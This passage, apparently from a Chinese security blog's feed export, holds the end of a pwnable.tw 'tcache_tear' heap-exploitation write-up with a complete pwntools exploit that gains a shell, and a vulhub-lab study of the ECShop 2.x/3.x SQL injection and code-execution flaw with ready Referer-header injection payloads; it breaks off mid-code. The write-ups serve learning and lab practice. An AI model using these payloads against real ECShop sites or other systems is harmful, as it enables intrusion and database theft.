title="漏洞分析及利用"></a>漏洞分析及利用</h3><ul><li><code>free()</code>的时候，没有检验<code>ptr</code>是否已被释放过，从而导致<code>double free</code>漏洞。</li><li><code>sub_400A25()</code>中的长度是<code>unsigned int</code>，在<code>malloc_chunk</code>中如果长度小于<code>16</code>就会产生堆溢出漏洞。</li></ul><p>因为程序的唯一输出只有<code>info()</code>中的输出<code>name</code>，所以需通过将<code>name_ptr</code>修改成<code>libc</code>的地址，从而造成地址泄露。注意到有<code>double free</code>漏洞的存在，我们可以考虑利用<code>tcache dup</code>来分配指定位置的<code>chunk</code>。</p><ul><li><p>在程序中分配一个<code>chunk</code>将其<code>free</code>两次，可以在<code>tcache</code>中看到两个相同的<code>tcachebin</code>。</p><p><img src="https://s2.ax1x.com/2019/11/17/Mr3EEq.png" alt=""></p></li><li><p>再<code>malloc</code>相应大小的<code>chunk</code>，<code>data</code>中写入想要的地址。两次<code>malloc</code>后我们就能完成相应地址.</p><p><img src="https://s2.ax1x.com/2019/11/17/Mr86m9.png" alt=""></p></li></ul><p>最终方法：可以通过在<code>name_ptr</code>的位置伪造出一个<code>chunk</code>，使它<code>free</code>之后被放入<code>unsorted bin</code>中，从而在<code>name_ptr</code>中写入<code>unsorted bin</code>的地址。再通过<code>info()</code>将地址泄露出来，根据相对偏移得到<code>libc_base</code>。再在<code>__free_hook</code>地址中写入<code>system</code>地址，<code>free</code>一个<code>/bin/sh</code>的<code>chunk</code>，从而获取<code>shell</code>。</p><p><strong>注：</strong>由于<code>tcache</code>所能容纳的最大chunk是<code>1032 = 0x408</code>，所以<code>name_ptr</code>处的<code>chunk</code>要大于<code>0x408</code>。</p><h3 id="所遇问题"><a href="#所遇问题" class="headerlink" title="所遇问题"></a>所遇问题</h3><p>在解题过程中，发现经过<code>double free</code>后分配到所需位置的<code>chunk</code>后，再分配相同大小的<code>chun</code>进行<code>double free</code>的</p><p>时候会出现错误。<code>chunk</code>没有进入<code>tcache bin</code>而是进入了<code>fast bin</code>中。再进行<code>double free</code>就会出现<code>double free or corruption</code>，很是疑惑，经过调试之后发现了问题所在：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (tcache</span><br><span class="line">    &amp;&amp; tc_idx &lt; mp_.tcache_bins</span><br><span class="line">    &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line"> &#123;</span><br><span class="line">    tcache_put (p, tc_idx);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p><code>_int_free()</code>中将<code>chunk</code>放入<code>tcache</code>之前会进行一些检测，其中一条是<code>tcache-&gt;counts[tc_idx]&lt; mp_.tcache_count</code>即对应的<code>tcache bin</code>中的个数小于最大个数<code>7</code>，进行<code>double free</code>后，<code>tcache bin</code>中的的个数为2。由于伪造了一个<code>chunk</code>，从<code>tcache bin</code>中取出了3个<code>chunk</code>是<code>tcache-&gt;counts[tc_idx]</code>变成了<code>-1</code>，在进行条件判断的时候是无符号整数，所以就造成了对应条件不成立使得该<code>chunk</code>没有进入<code>tcache</code>中。如下图所示：</p><p><img src="https://s2.ax1x.com/2019/11/17/MrtBNR.png" alt=""></p><h3 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.terminal = ['tmux', 'splitw', '-v']</span></span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'chall.pwnable.tw'</span>,<span class="number">10207</span>)</span><br><span class="line">elf = ELF(<span class="string">'./tcache_tear'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc-18292bd12d37bfaf58e8dded9db7f1f5da1192cb.so'</span>)</span><br><span class="line"></span><br><span class="line">name_addr = <span class="number">0x602060</span></span><br><span class="line">ptr = <span class="number">0x602088</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alloc</span><span class="params">(size, data)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Size:'</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">'Data:'</span>)</span><br><span class="line">    p.sendline(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Name:'</span>)</span><br><span class="line">    p.sendline(<span class="string">'Quincy'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    login()</span><br><span class="line">    alloc(<span class="number">0x60</span>, <span class="string">'a'</span>*<span class="number">5</span>)</span><br><span class="line">    free()</span><br><span class="line">    free()</span><br><span class="line">    alloc(<span class="number">0x60</span>, p64(name_addr - <span class="number">0x10</span> + <span class="number">0x500</span>))</span><br><span class="line">    alloc(<span class="number">0x60</span>, <span class="string">'a'</span>*<span class="number">5</span>)</span><br><span class="line">    alloc(<span class="number">0x60</span>, p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x21</span>))</span><br><span class="line">    alloc(<span class="number">0x70</span>, <span class="string">'a'</span>*<span class="number">5</span>)</span><br><span class="line">    free()</span><br><span class="line">    free()</span><br><span class="line">    alloc(<span class="number">0x70</span>, p64(name_addr - <span class="number">0x10</span>))</span><br><span class="line">    alloc(<span class="number">0x70</span>, <span class="string">'a'</span>*<span class="number">5</span>)</span><br><span class="line">    alloc(<span class="number">0x70</span>, p64(<span class="number">0</span>)+p64(<span class="number">0x501</span>)+p64(<span class="number">0</span>)*<span class="number">5</span>+p64(name_addr))</span><br><span class="line">    free()</span><br><span class="line">    info()</span><br><span class="line">    p.recvuntil(<span class="string">'Name :'</span>)</span><br><span class="line">    unsortbin_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line">    log.info(<span class="string">'unsortbin_addr: &#123;&#125;'</span>.format(hex(unsortbin_addr)))</span><br><span class="line">    main_arena_addr = unsortbin_addr - <span class="number">0x60</span></span><br><span class="line">    libc_base = main_arena_addr - <span class="number">0x3ebc40</span></span><br><span class="line">    log.info(<span class="string">'libc_base: &#123;&#125;'</span>.format(hex(libc_base)))</span><br><span class="line">    free_hook = libc.symbols[<span class="string">'__free_hook'</span>] + libc_base</span><br><span class="line">    system_addr = libc.symbols[<span class="string">'system'</span>] + libc_base</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x10</span>):</span><br><span class="line">        alloc(<span class="number">0x50</span>, <span class="string">'a'</span>*<span class="number">5</span>)</span><br><span class="line">    alloc(<span class="number">0x50</span>, <span class="string">'a'</span>*<span class="number">5</span>)</span><br><span class="line">    free()</span><br><span class="line">    free()</span><br><span class="line">    alloc(<span class="number">0x50</span>, p64(free_hook))</span><br><span class="line">    alloc(<span class="number">0x50</span>, <span class="string">'a'</span>)</span><br><span class="line">    alloc(<span class="number">0x50</span>, p64(system_addr))</span><br><span class="line">    alloc(<span class="number">0x40</span>, <span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">    free()</span><br><span class="line">    <span class="comment"># gdb.attach(p)</span></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure><h2 id="0x04-参考链接"><a href="#0x04-参考链接" class="headerlink" title="0x04 参考链接"></a>0x04 参考链接</h2><ul><li><p><a href="https://www.secpulse.com/archives/71958.html" target="_blank" rel="noopener">Pwn Heap With Tcache</a></p></li><li><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/tcache_attack-zh/#tcache-dup" target="_blank" rel="noopener">Tcache_Attack - CTF WIKI</a></p></li><li><p><a href="http://p4nda.top/2018/03/20/tcache/" target="_blank" rel="noopener">tcache 源码分析及利用思路</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ECShop 2.x/3.x SQL注入/任意代码执行漏洞的学习</title>
      <link href="/writing/ECShop%202.x:3.x%20SQL%E6%B3%A8%E5%85%A5:%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%AD%A6%E4%B9%A0/"/>
      <url>/writing/ECShop%202.x:3.x%20SQL%E6%B3%A8%E5%85%A5:%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>前几天在vps上搭建了<a href="https://vulhub.org" target="_blank" rel="noopener">vulhub</a>漏洞测试靶场，在此记录一下其中<code>ECShop 2.x SQL注入/任意代码执行漏洞</code>的学习过程</p><h2 id="0x02-漏洞成因"><a href="#0x02-漏洞成因" class="headerlink" title="0x02 漏洞成因"></a>0x02 漏洞成因</h2><h3 id="1-sql注入"><a href="#1-sql注入" class="headerlink" title="1.sql注入"></a>1.sql注入</h3><p>先看<code>user.php</code>的用户登录环节：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elseif</span> ($action == <span class="string">'login'</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($back_act))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>($back_act) &amp;&amp; <span class="keyword">isset</span>($GLOBALS[<span class="string">'_SERVER'</span>][<span class="string">'HTTP_REFERER'</span>]))</span><br><span class="line">        &#123;</span><br><span class="line">            $back_act = strpos($GLOBALS[<span class="string">'_SERVER'</span>][<span class="string">'HTTP_REFERER'</span>], <span class="string">'user.php'</span>) ? <span class="string">'./index.php'</span> : $GLOBALS[<span class="string">'_SERVER'</span>][<span class="string">'HTTP_REFERER'</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            $back_act = <span class="string">'user.php'</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    $captcha = intval($_CFG[<span class="string">'captcha'</span>]);</span><br><span class="line">    <span class="keyword">if</span> (($captcha &amp; CAPTCHA_LOGIN) &amp;&amp; (!($captcha &amp; CAPTCHA_LOGIN_FAIL) || (($captcha &amp; CAPTCHA_LOGIN_FAIL) &amp;&amp; $_SESSION[<span class="string">'login_fail'</span>] &gt; <span class="number">2</span>)) &amp;&amp; gd_version() &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        $GLOBALS[<span class="string">'smarty'</span>]-&gt;assign(<span class="string">'enabled_captcha'</span>, <span class="number">1</span>);</span><br><span class="line">        $GLOBALS[<span class="string">'smarty'</span>]-&gt;assign(<span class="string">'rand'</span>, mt_rand());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $smarty-&gt;assign(<span class="string">'back_act'</span>, $back_act);</span><br><span class="line">    $smarty-&gt;display(<span class="string">'user_passport.dwt'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只要<code>$back_act</code>在之前为空，那么它将等于<code>$GLOBALS[&#39;_SERVER&#39;][&#39;HTTP_REFERER&#39;]</code>，为我们可控的参数。</p><p>Ecshop 使用了 php 模版引擎 smarty ，该引擎有两个基本的函数<code>assign()、display()</code>。<code>assign()</code>函数用于在模版执行时为模版变量赋值，<code>display()</code>函数用于显示模版。smarty运行时，会读取模版文件，将模版文件中的占位符替换成<code>assign()</code>函数传递过来的参数值，并输出一个编译处理后的php文件，交由服务器运行。</p><p>我们来看一下相关文件<code>/includes/cls_template.php</code>:</p><p><code>function assign()</code>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">assign</span><span class="params">($tpl_var, $value = <span class="string">''</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_array($tpl_var))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">foreach</span> ($tpl_var <span class="keyword">AS</span> $key =&gt; $val)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> ($key != <span class="string">''</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;_var[$key] = $val;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ($tpl_var != <span class="string">''</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;_var[$tpl_var] = $value;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以发现<code>assign()</code>用于在模版变量里赋值。</p><p><code>function display()</code>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">display</span><span class="params">($filename, $cache_id = <span class="string">''</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;_seterror++;</span><br><span class="line">    error_reporting(E_ALL ^ E_NOTICE);</span><br><span class="line">    <span class="keyword">$this</span>-&gt;_checkfile = <span class="keyword">false</span>;</span><br><span class="line">    $out = <span class="keyword">$this</span>-&gt;fetch($filename, $cache_id);</span><br><span class="line">    <span class="keyword">if</span> (strpos($out, <span class="keyword">$this</span>-&gt;_echash) !== <span class="keyword">false</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        $k = explode(<span class="keyword">$this</span>-&gt;_echash, $out);</span><br><span class="line">        <span class="keyword">foreach</span> ($k <span class="keyword">AS</span> $key =&gt; $val)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (($key % <span class="number">2</span>) == <span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                $k[$key] = <span class="keyword">$this</span>-&gt;insert_mod($val);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        $out = implode(<span class="string">''</span>, $k);</span><br><span class="line">    &#125;</span><br><span class="line">    error_reporting(<span class="keyword">$this</span>-&gt;_errorlevel);</span><br><span class="line">    <span class="keyword">$this</span>-&gt;_seterror--;</span><br><span class="line">    <span class="keyword">echo</span> $out;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从函数来看，首先会调用 <code>$this-&gt;fetch</code> 来处理<code>user_passport.dwt</code> 模板文件，<code>fetch()</code> 函数中会调用 <code>$this-&gt;make_compiled</code> 来编译模板。 <code>make_compiled</code> 会将模板中的变量解析，也就是在这个时候将上面 <code>assign</code> 中注册到的变量 <code>$back_act</code> 传递进去了，解析完变量之后返回到 <code>display</code> 函数中。此时 <code>$out</code> 是解析变量后的html内容，判断 <code>$this-&gt;_echash</code> 是否在 <code>$out</code> 中，若在，使用 <code>$this-&gt;_echash</code> 来分割内容，得到 <code>$k</code> 然后交给 <code>insert_mod</code> 处理。</p><p>在文件开头我们发现<code>$_echash = &#39;554fcae493e564ee0dc75bdf2ebf94ca&#39;;</code>是一个固定不变的值。由于<code>$out</code>可控，所以<code>$k</code>可控。</p><p>再来看一下<code>insert_mod()</code>的内容：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">insert_mod</span><span class="params">($name)</span> // 处理动态内容</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">list</span>($fun, $para) = explode(<span class="string">'|'</span>, $name);</span><br><span class="line">    $para = unserialize($para);</span><br><span class="line">    $fun = <span class="string">'insert_'</span> . $fun;</span><br><span class="line">    <span class="keyword">return</span> $fun($para);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>$name</code> 传递进来，先根据 <code>|</code> 进行分割，得到 <code>$para</code> 和 <code>$fun</code> ，<code>$para</code> 进行反序列操作，<code>insert_</code> 和 <code>$fun</code> 拼接，最后动态调用 <code>$fun($para)</code> 。函数名部分可控，参数完全可控。接下来就是寻找以 <code>insert_</code> 开头的可利用的函数了，在 <code>ecshop/includes/lib_insert.php</code> 有一个 <code>insert_ads</code> 函数，正好满足要求：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">insert_ads</span><span class="params">($arr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">static</span> $static_res = <span class="keyword">NULL</span>;</span><br><span class="line"></span><br><span class="line">    $time = gmtime();</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>($arr[<span class="string">'num'</span>]) &amp;&amp; $arr[<span class="string">'num'</span>] != <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        $sql  = <span class="string">'SELECT a.ad_id, a.position_id, a.media_type, a.ad_link, a.ad_code, a.ad_name, p.ad_width, '</span> .</span><br><span class="line">                <span class="string">'p.ad_height, p.position_style, RAND() AS rnd '</span> .</span><br><span class="line">                <span class="string">'FROM '</span> . $GLOBALS[<span class="string">'ecs'</span>]-&gt;table(<span class="string">'ad'</span>) . <span class="string">' AS a '</span>.</span><br><span class="line">                <span class="string">'LEFT JOIN '</span> . $GLOBALS[<span class="string">'ecs'</span>]-&gt;table(<span class="string">'ad_position'</span>) . <span class="string">' AS p ON a.position_id = p.position_id '</span> .</span><br><span class="line">                <span class="string">"WHERE enabled = 1 AND start_time &lt;= '"</span> . $time . <span class="string">"' AND end_time &gt;= '"</span> . $time . <span class="string">"' "</span>.</span><br><span class="line">                <span class="string">"AND a.position_id = '"</span> . $arr[<span class="string">'id'</span>] . <span class="string">"' "</span> .</span><br><span class="line">                <span class="string">'ORDER BY rnd LIMIT '</span> . $arr[<span class="string">'num'</span>];</span><br><span class="line">        $res = $GLOBALS[<span class="string">'db'</span>]-&gt;GetAll($sql);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中<code>$arr[&#39;num&#39;]</code>和<code>$arr[&#39;id&#39;]</code>我们可以控制，而且没有作任何过滤，所以此处存在SQL注入漏洞。</p><p>其中一个Payload如下：</p><p><code>Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:&quot;num&quot;;s:72:&quot;0,1 procedure analyse(extractvalue(rand(),concat(0x7e,version())),1)-- -&quot;;s:2:&quot;id&quot;;i:1;}554fcae493e564ee0dc75bdf2ebf94ca</code></p><p><img src="https://s1.ax1x.com/2018/10/27/icZ1PS.png" alt=""></p><p>形成的SQL语句为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT a.ad_id, a.position_id, a.media_type, a.ad_link, a.ad_code, a.ad_name, p.ad_width, p.ad_height, p.position_style, RAND() AS rnd FROM &#96;ecsshop2&#96;.&#96;ecs_ad&#96; AS a LEFT JOIN &#96;ecsshop2&#96;.&#96;ecs_ad_position&#96; AS p ON a.position_id &#x3D; p.position_id WHERE enabled &#x3D; 1 AND start_time &lt;&#x3D; &#39;1537322291&#39; AND end_time &gt;&#x3D; &#39;1537322291&#39; AND a.position_id &#x3D; &#39;1&#39; ORDER BY rnd LIMIT 0,1 procedure analyse(extractvalue(rand(),concat(0x7e,version())),1)-- -</span><br></pre></td></tr></table></figure><p>但是由于<code>procedure analyse</code>在高版本的<code>mysql</code>中不能运行，所以显得有点鸡肋。所以我们可以换种做法，在<code>$arr[&#39;id&#39;]</code>出直接注入然后利用<code>#</code>将后面的<code>ORDER BY rnd LIMIT</code>注释掉。或着利用两个可控参数用<code>/**/</code>将中间的<code>ORDER BY rnd LIMIT</code>注释掉。</p><p>Payload:</p><ol><li><p><code>Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:&quot;num&quot;;s:3:&quot;669&quot;;s:2:&quot;id&quot;;s:133:&quot;1&#39; and updatexml(1,make_set(3,&#39;~&#39;,(select group_concat(table_name) from information_schema.tables where table_schema=database())),1)#&quot;;}554fcae493e564ee0dc75bdf2ebf94ca</code></p></li><li><p><code>Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:2:&quot;id&quot;;s:4:&quot;&#39; /*&quot;;s:3:&quot;num&quot;;s:132:&quot;*/ and updatexml(1,make_set(3,&#39;~&#39;,(select group_concat(table_name) from information_schema.tables where table_schema=database())),1)&quot;;}</code></p></li></ol><h3 id="2-命令执行"><a href="#2-命令执行" class="headerlink" title="2.命令执行"></a>2.命令执行</h3><p>在<code>$insert_ads()</code>中会继续调用模版函数<code>fetch()</code>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$ads = <span class="keyword">array</span>();</span><br><span class="line">$position_style = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">foreach</span> ($res <span class="keyword">AS</span> $row)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ($row[<span class="string">'position_id'</span>] != $arr[<span class="string">'id'</span>])</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $position_style = $row[<span class="string">'position_style'</span>];</span><br><span class="line">    <span class="keyword">switch</span> ($row[<span class="string">'media_type'</span>])</span><br><span class="line">    &#123;</span><br><span class="line">...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$position_style = <span class="string">'str:'</span> . $position_style;</span><br><span class="line">$need_cache = $GLOBALS[<span class="string">'smarty'</span>]-&gt;caching;</span><br><span class="line">$GLOBALS[<span class="string">'smarty'</span>]-&gt;caching = <span class="keyword">false</span>;</span><br><span class="line">$GLOBALS[<span class="string">'smarty'</span>]-&gt;assign(<span class="string">'ads'</span>, $ads);</span><br><span class="line">$val = $GLOBALS[<span class="string">'smarty'</span>]-&gt;fetch($position_style);</span><br><span class="line">$GLOBALS[<span class="string">'smarty'</span>]-&gt;caching = $need_cache;</span><br><span class="line"><span class="keyword">return</span> $val;</span><br></pre></td></tr></table></figure><p>而 <code>position_style</code> 是SQL语句查询的结果，结果上面这个SQL注入漏洞，SQL查询的结果可控，也就是 <code>$position_style</code> 可控。要到 <code>$position_style = $row[&#39;position_style&#39;];</code> 还有一个条件，就是 <code>$row[&#39;position_id&#39;]</code> 要等于 <code>$arr[&#39;id&#39;]</code> 。 </p><p>　　并且构造SQL注入时，这段SQL操作 <code>ORDER BY rnd LIMIT 1</code> 部分换行了截断不了,所以需要在<code>$arr[&#39;id&#39;]</code>处构造注释来配合<code>$arr[&#39;num&#39;]</code>进行union查询。再来看看<code>fetch()</code>函数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fetch</span><span class="params">($filename, $cache_id = <span class="string">''</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;_seterror)</span><br><span class="line">    &#123;</span><br><span class="line">        error_reporting(E_ALL ^ E_NOTICE);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;_seterror++;</span><br><span class="line">    <span class="keyword">if</span> (strncmp($filename,<span class="string">'str:'</span>, <span class="number">4</span>) == <span class="number">0</span>)</span><br><span 